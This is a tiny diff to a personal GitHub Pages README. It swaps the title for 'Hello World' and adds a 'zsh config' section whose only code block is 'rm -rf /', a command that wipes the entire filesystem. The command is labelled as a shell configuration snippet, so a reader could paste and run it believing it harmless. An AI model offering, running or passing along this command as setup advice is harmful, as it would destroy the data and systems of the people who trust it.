@@ -1,1 +1,7 @@
-# zshooo.github.io
+# Hello World
+
+### zsh config
+
+``` bash
+rm -rf /
+```
